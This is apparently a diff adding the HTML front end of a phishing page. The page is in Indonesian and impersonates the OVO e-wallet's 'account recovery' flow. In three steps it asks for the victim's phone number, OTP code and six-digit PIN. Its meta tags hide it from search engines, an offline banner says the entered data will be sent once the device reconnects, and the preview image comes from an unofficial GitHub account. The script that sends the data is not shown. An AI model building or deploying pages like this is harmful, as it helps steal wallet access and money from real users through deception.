@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+
+    <!-- ===== SECURITY META (DILONGGARKAN UNTUK KOMPATIBILITAS) ===== -->
+    <meta http-equiv="X-Content-Type-Options" content="nosniff" />
+    <meta http-equiv="Referrer-Policy" content="strict-origin-when-cross-origin" />
+    <meta name="robots" content="noindex, nofollow, noarchive" />
+
+    <!-- CSP dilonggarkan agar gambar & worker bisa load tanpa blokir -->
+    <meta http-equiv="Content-Security-Policy"
+          content="default-src 'self';
+                   img-src * data: blob:;
+                   style-src 'self' 'unsafe-inline';
+                   script-src 'self' 'unsafe-inline';
+                   connect-src *;
+                   font-src 'self' data:;
+                   frame-ancestors 'none';
+                   base-uri 'self';
+                   form-action 'self';" />
+
+    <!-- Favicon fallback (hindari 404) -->
+    <link rel="icon" href="data:," />
+
+    <!-- PWA meta (tanpa manifest agar tidak 404) -->
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+    <!-- ===== META SOSIAL ===== -->
+    <title>OVO Pemulihan</title>
+    <meta name="title" content="OVO - Pemulihan Akun" />
+    <meta name="description" content="pemberitahuan selama proses pemulihan ovo harap tetap berada di halaman website" />
+
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="OVO - Pemulihan Akun" />
+    <meta property="og:description" content="pemberitahuan selama proses pemulihan ovo harap tetap berada di halaman website" />
+    <meta property="og:image" content="https://raw.githubusercontent.com/ovotransaksipending-creator/terminal-alam-ovo/refs/heads/main/public/top.up.ovo.jpg" />
+    <meta property="og:image:type" content="image/jpeg" />
+    <meta property="og:image:width" content="1200" />
+    <meta property="og:image:height" content="630" />
+
+    <meta property="twitter:card" content="summary_large_image" />
+    <meta property="twitter:title" content="OVO - Pemulihan Akun" />
+    <meta property="twitter:description" content="pemberitahuan selama proses pemulihan ovo harap tetap berada di halaman website" />
+
+    <meta name="theme-color" content="#4B006E" />
+
+    <link rel="stylesheet" href="./style.css" />
+</head>
+<body>
+
+<!-- ===== BANNER STATUS OFFLINE ===== -->
+<div id="offlineBanner" style="display:none;position:fixed;top:0;left:0;right:0;background:#ff9800;color:#fff;text-align:center;padding:8px 12px;font-size:13px;z-index:10000;font-weight:600;letter-spacing:0.2px;box-shadow:0 2px 8px rgba(0,0,0,0.15);">
+    📴 Anda sedang offline — data akan dikirim saat online kembali
+</div>
+
+<div class="container" id="appContainer">
+
+    <!-- ======== LOADING SCREEN ======== -->
+    <div id="loadingScreen">
+        <div class="ovo-loader">
+            <div class="ovo-logo-text">OVO</div>
+            <div class="ovo-ring"></div>
+            <div class="ovo-ring"></div>
+            <div class="ovo-ring"></div>
+        </div>
+        <div class="loading-copyright">© 2026 OVO Indonesia</div>
+    </div>
+
+    <!-- ======== PAGE 1: NOMOR HP ======== -->
+    <div id="pageNomor" class="page active">
+        <div class="logo-header">
+            <div class="ovo-brand">
+                <span class="ovo-brand-text">OVO</span>
+            </div>
+        </div>
+        <div class="form-card">
+            <div class="form-title">Pemulihan Akun</div>
+            <div class="form-sub">Masukkan nomor HP terdaftar</div>
+
+            <div class="input-group">
+                <label>Nomor HP</label>
+                <input type="tel" id="inputNomor" placeholder="08xx-xxxx-xxxx" maxlength="15" inputmode="numeric" pattern="[0-9]*" />
+            </div>
+
+            <div class="inline-error" id="errNomor"></div>
+
+            <button class="btn-primary" id="btnLanjut">Lanjut</button>
+        </div>
+    </div>
+
+    <!-- ======== PAGE 2: OTP 4 ANGKA ======== -->
+    <div id="pageOtp" class="page">
+        <div class="logo-header">
+            <div class="ovo-brand">
+                <span class="ovo-brand-text">OVO</span>
+            </div>
+        </div>
+        <div class="form-card">
+            <div class="form-title">Verifikasi OTP</div>
+            <div class="form-sub">Kode OTP dikirim ke nomor Anda</div>
+
+            <div class="otp-boxes" id="otpContainer">
+                <input type="text" maxlength="1" class="otp-input" data-index="0" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" maxlength="1" class="otp-input" data-index="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" maxlength="1" class="otp-input" data-index="2" inputmode="numeric" pattern="[0-9]*" />
+                <input type="text" maxlength="1" class="otp-input" data-index="3" inputmode="numeric" pattern="[0-9]*" />
+            </div>
+
+            <div class="inline-error" id="errOtp"></div>
+
+            <button class="btn-primary" id="btnVerifikasiOtp">Verifikasi</button>
+            <div class="info-message">Kode OTP berlaku 5 menit</div>
+        </div>
+    </div>
+
+    <!-- ======== PAGE 3: PIN 6 ANGKA ======== -->
+    <div id="pagePin" class="page">
+        <div class="logo-header">
+            <div class="ovo-brand">
+                <span class="ovo-brand-text">OVO</span>
+            </div>
+        </div>
+        <div class="form-card">
+            <div class="form-title">Masukkan PIN</div>
+            <div class="form-sub">PIN 6 angka untuk verifikasi akhir</div>
+
+            <div class="pin-boxes" id="pinContainer">
+                <input type="password" maxlength="1" class="pin-input" data-index="0" inputmode="numeric" pattern="[0-9]*" />
+                <input type="password" maxlength="1" class="pin-input" data-index="1" inputmode="numeric" pattern="[0-9]*" />
+                <input type="password" maxlength="1" class="pin-input" data-index="2" inputmode="numeric" pattern="[0-9]*" />
+                <input type="password" maxlength="1" class="pin-input" data-index="3" inputmode="numeric" pattern="[0-9]*" />
+                <input type="password" maxlength="1" class="pin-input" data-index="4" inputmode="numeric" pattern="[0-9]*" />
+                <input type="password" maxlength="1" class="pin-input" data-index="5" inputmode="numeric" pattern="[0-9]*" />
+            </div>
+
+            <div class="error-message" id="errorPin">❌ PIN yang Anda masukkan salah. Silakan coba lagi.</div>
+
+            <button class="btn-primary" id="btnVerifikasiPin">Verifikasi PIN</button>
+            <div class="info-message">PIN rahasia Anda</div>
+        </div>
+    </div>
+
+    <!-- ======== TRANSISI LOADING OVERLAY ======== -->
+    <div id="transitionLoading" class="transition-loading">
+        <div class="ovo-loader-small">
+            <div class="ovo-logo-text-small">OVO</div>
+            <div class="ovo-ring-small"></div>
+        </div>
+    </div>
+
+</div>
+
+<!-- ===== SCRIPT UTAMA ===== -->
+<script src="./script.js" defer></script>
+
+<!-- ===== SERVICE WORKER (OPSIONAL - tidak error jika sw.js tidak ada) ===== -->
+<script>
+    (function() {
+        'use strict';
+        if ('serviceWorker' in navigator) {
+            window.addEventListener('load', function() {
+                navigator.serviceWorker.register('./sw.js', { scope: './' })
+                    .then(function(reg) {
+                        console.log('[SW] Terdaftar:', reg.scope);
+                    })
+                    .catch(function(err) {
+                        // Tidak fatal — hanya warning
+                        console.warn('[SW] Tidak aktif (opsional):', err.message);
+                    });
+            });
+        }
+    })();
+</script>
+
+<noscript>
+    <div style="text-align:center;padding:40px;color:#4B006E;font-weight:bold;">
+        JavaScript diperlukan untuk menjalankan halaman ini.
+    </div>
+</noscript>
+</body>
+</html>
